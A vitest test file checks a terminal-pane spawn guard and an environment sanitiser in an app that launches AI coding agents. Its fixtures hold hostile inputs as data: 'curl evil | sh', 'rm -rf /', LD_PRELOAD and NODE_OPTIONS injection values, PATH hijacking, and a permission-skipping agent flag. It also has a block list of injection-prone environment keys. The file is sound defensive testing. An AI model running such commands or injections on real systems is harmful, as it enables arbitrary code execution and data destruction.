import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import type { Pane, PaneSpec, PersistedState, Profile, Workspace } from '@shared/types'
import { isBlockedEnvKey, sanitizeEnv, verifyPaneSpec, type GuardSources } from './pane-guard'

/**
 * The gate on `pty:ensure` (issue #18): the renderer's spec is only a claim,
 * and everything spawned has to be re-derived from the persisted state or the
 * profile registry. These tests drive the gate with both sources stubbed, in
 * the shapes the app actually produces — a pane the debounced save has already
 * written, a brand-new pane straight off a profile, and the specs an attacker
 * would send that correspond to neither.
 */

const pane = (over: Partial<Pane> = {}): Pane =>
  ({
    id: 'pane_1',
    profileId: 'agent:claude',
    command: '/usr/local/bin/claude',
    args: [],
    cwd: '/home/user/project',
    status: 'idle',
    epoch: 0,
    ...over
  }) as Pane

const state = (...panes: Pane[]): PersistedState =>
  ({
    version: 1,
    activeWorkspaceId: 'ws_1',
    workspaces: [{ id: 'ws_1', name: 'project', panes } as Workspace]
  }) as PersistedState

const profile = (over: Partial<Profile> = {}): Profile =>
  ({
    id: 'agent:claude',
    name: 'Claude Code',
    command: '/usr/local/bin/claude',
    args: [],
    kind: 'agent',
    icon: 'CC',
    accent: '#d97757',
    available: true,
    ...over
  }) as Profile

const spec = (over: Partial<PaneSpec> = {}): PaneSpec => ({
  id: 'pane_1',
  command: '/usr/local/bin/claude',
  args: [],
  cwd: '/home/user/project',
  ...over
})

/** Sources with no retry delay — the race being retried for is not under test. */
const sources = (over: Partial<GuardSources> = {}): GuardSources => ({
  state: () => null,
  profiles: () => [],
  retryMs: 0,
  ...over
})

beforeEach(() => {
  // sanitizeEnv announces every key it drops; asserted where relevant, silent otherwise.
  vi.spyOn(console, 'warn').mockImplementation(() => {})
})

afterEach(() => {
  vi.restoreAllMocks()
})

describe('verifyPaneSpec, against the persisted state', () => {
  it('accepts a spec that matches its saved pane, field for field', async () => {
    const verdict = await verifyPaneSpec(spec(), sources({ state: () => state(pane()) }))

    expect(verdict).toEqual({ ok: true, spec: spec() })
  })

  it('spawns the persisted copy, not the renderer object it was handed', async () => {
    const raw = spec()
    const verdict = await verifyPaneSpec(raw, sources({ state: () => state(pane()) }))

    if (!verdict.ok) throw new Error(verdict.reason)
    expect(verdict.spec).not.toBe(raw)
    expect(verdict.spec.args).not.toBe(raw.args)
  })

  it('refuses a spec whose command is not what the saved pane runs', async () => {
    const verdict = await verifyPaneSpec(
      spec({ command: '/bin/sh', args: ['-c', 'curl evil | sh'] }),
      sources({ state: () => state(pane()) })
    )

    expect(verdict.ok).toBe(false)
  })

  it('refuses a spec that bolts viaShell onto a pane saved without it', async () => {
    const verdict = await verifyPaneSpec(
      spec({ viaShell: true }),
      sources({ state: () => state(pane()) })
    )

    expect(verdict.ok).toBe(false)
  })

  it('refuses a spec that adds env the saved pane does not carry', async () => {
    const verdict = await verifyPaneSpec(
      spec({ env: { LD_PRELOAD: '/tmp/evil.so' } }),
      sources({ state: () => state(pane()) })
    )

    expect(verdict.ok).toBe(false)
  })

  it('accepts a saved custom command line, env and all — the free-form feature', async () => {
    const custom = pane({
      id: 'pane_2',
      profileId: 'custom',
      command: 'npm run dev -- --port 3000',
      args: [],
      viaShell: true,
      env: { ANTHROPIC_MODEL: 'claude-fable-5' }
    })
    const asked = spec({
      id: 'pane_2',
      command: 'npm run dev -- --port 3000',
      viaShell: true,
      env: { ANTHROPIC_MODEL: 'claude-fable-5' }
    })

    const verdict = await verifyPaneSpec(asked, sources({ state: () => state(custom) }))

    expect(verdict).toEqual({ ok: true, spec: asked })
  })

  it('strips blocked env keys even when the saved pane itself carries them', async () => {
    const poisoned = pane({
      env: { NODE_OPTIONS: '--require /tmp/evil.js', HD_FINE: 'yes' }
    })
    const asked = spec({ env: { NODE_OPTIONS: '--require /tmp/evil.js', HD_FINE: 'yes' } })

    const verdict = await verifyPaneSpec(asked, sources({ state: () => state(poisoned) }))

    if (!verdict.ok) throw new Error(verdict.reason)
    expect(verdict.spec.env).toEqual({ HD_FINE: 'yes' })
  })
})

describe('verifyPaneSpec, against the profile registry', () => {
  it('accepts a brand-new pane whose command line is exactly a known profile', async () => {
    const verdict = await verifyPaneSpec(
      spec({ id: 'pane_new', cwd: '/anywhere/the/user/picked' }),
      sources({ profiles: () => [profile()] })
    )

    expect(verdict).toEqual({
      ok: true,
      spec: spec({ id: 'pane_new', cwd: '/anywhere/the/user/picked' })
    })
  })

  it('waits for the profile list when detection is asynchronous', async () => {
    const verdict = await verifyPaneSpec(
      spec({ id: 'pane_new' }),
      sources({ profiles: () => Promise.resolve([profile()]) })
    )

    expect(verdict.ok).toBe(true)
  })

  it('refuses a profile command with args the profile does not have', async () => {
    const verdict = await verifyPaneSpec(
      spec({ id: 'pane_new', args: ['--dangerously-skip-permissions'] }),
      sources({ profiles: () => [profile()] })
    )

    expect(verdict.ok).toBe(false)
  })

  it('refuses extra env riding on a detected profile, which carries none', async () => {
    const verdict = await verifyPaneSpec(
      spec({ id: 'pane_new', env: { PATH: '/tmp/evil-bin' } }),
      sources({ profiles: () => [profile()] })
    )

    expect(verdict.ok).toBe(false)
  })

  it('accepts a saved launcher — viaShell command line plus its own env', async () => {
    const launcher = profile({
      id: 'custom:abc',
      kind: 'custom',
      command: 'make watch',
      args: [],
      viaShell: true,
      env: { HD_MODE: 'dev' }
    })

    const verdict = await verifyPaneSpec(
      spec({ id: 'pane_new', command: 'make watch', viaShell: true, env: { HD_MODE: 'dev' } }),
      sources({ profiles: () => [launcher] })
    )

    if (!verdict.ok) throw new Error(verdict.reason)
    expect(verdict.spec.command).toBe('make watch')
    expect(verdict.spec.viaShell).toBe(true)
    expect(verdict.spec.env).toEqual({ HD_MODE: 'dev' })
  })

  it('never matches the empty-command "Custom command…" placeholder', async () => {
    const placeholder = profile({ id: 'custom', kind: 'custom', command: '', args: [] })

    const verdict = await verifyPaneSpec(
      spec({ id: 'pane_new', command: '' }),
      sources({ profiles: () => [placeholder] })
    )

    expect(verdict.ok).toBe(false)
  })
})

describe('verifyPaneSpec, at the edges', () => {
  it('refuses a spec that corresponds to nothing anywhere', async () => {
    const verdict = await verifyPaneSpec(
      spec({ id: 'pane_ghost', command: '/bin/sh', args: ['-c', 'id'] }),
      sources({ state: () => state(pane()), profiles: () => [profile()] })
    )

    expect(verdict).toEqual({
      ok: false,
      reason: expect.stringContaining('pane_ghost') as string
    })
  })

  it.each([
    ['nothing at all', undefined],
    ['null', null],
    ['a string', 'rm -rf /'],
    ['a spec without an id', { command: 'x', args: [], cwd: '/' }],
    ['args that are not strings', { id: 'p', command: 'x', args: [{}], cwd: '/' }],
    ['env with non-string values', { id: 'p', command: 'x', args: [], cwd: '/', env: { A: 1 } }]
  ])('refuses %s as malformed', async (_name, raw) => {
    const verdict = await verifyPaneSpec(raw, sources())

    expect(verdict).toEqual({ ok: false, reason: 'malformed pane spec' })
  })

  it('lets a live session re-attach without consulting either source', async () => {
    const profiles = vi.fn(() => [])
    const verdict = await verifyPaneSpec(
      spec({ id: 'pane_live' }),
      sources({ profiles, attached: (id) => id === 'pane_live' })
    )

    expect(verdict.ok).toBe(true)
    expect(profiles).not.toHaveBeenCalled()
  })

  it('re-reads the state once, so a save that lands a beat late still counts', async () => {
    let asked = 0
    const verdict = await verifyPaneSpec(
      spec(),
      sources({
        state: () => {
          asked += 1
          return asked > 1 ? state(pane()) : null
        }
      })
    )

    expect(verdict.ok).toBe(true)
    expect(asked).toBe(2)
  })
})

describe('sanitizeEnv', () => {
  it('keeps ordinary user variables exactly as given', () => {
    const env = { ANTHROPIC_MODEL: 'claude-fable-5', HD_TOKEN: 'a=b c' }

    expect(sanitizeEnv(env)).toEqual(env)
  })

  it.each([
    'PATH',
    'PATHEXT',
    'ELECTRON_RUN_AS_NODE',
    'NODE_OPTIONS',
    'NODE_REPL_EXTERNAL_MODULE',
    'LD_PRELOAD',
    'LD_LIBRARY_PATH',
    'LD_AUDIT',
    'DYLD_INSERT_LIBRARIES',
    'DYLD_LIBRARY_PATH',
    'BASH_ENV',
    'ENV',
    'ZDOTDIR'
  ])('drops %s', (key) => {
    expect(isBlockedEnvKey(key)).toBe(true)
    expect(sanitizeEnv({ [key]: 'anything', KEEP: 'me' })).toEqual({ KEEP: 'me' })
  })

  it('blocks case variants, the way a Windows environment would read them', () => {
    expect(sanitizeEnv({ Path: '/tmp/evil', 'node_options': '-r x' })).toBeUndefined()
  })

  it('does not block names that merely start with LD', () => {
    expect(isBlockedEnvKey('LDFLAGS')).toBe(false)
    expect(sanitizeEnv({ LDFLAGS: '-L/opt/lib' })).toEqual({ LDFLAGS: '-L/opt/lib' })
  })

  it('hands back undefined for nothing, and for nothing left', () => {
    expect(sanitizeEnv(undefined)).toBeUndefined()
    expect(sanitizeEnv({})).toBeUndefined()
    expect(sanitizeEnv({ LD_PRELOAD: '/tmp/evil.so' })).toBeUndefined()
  })
})
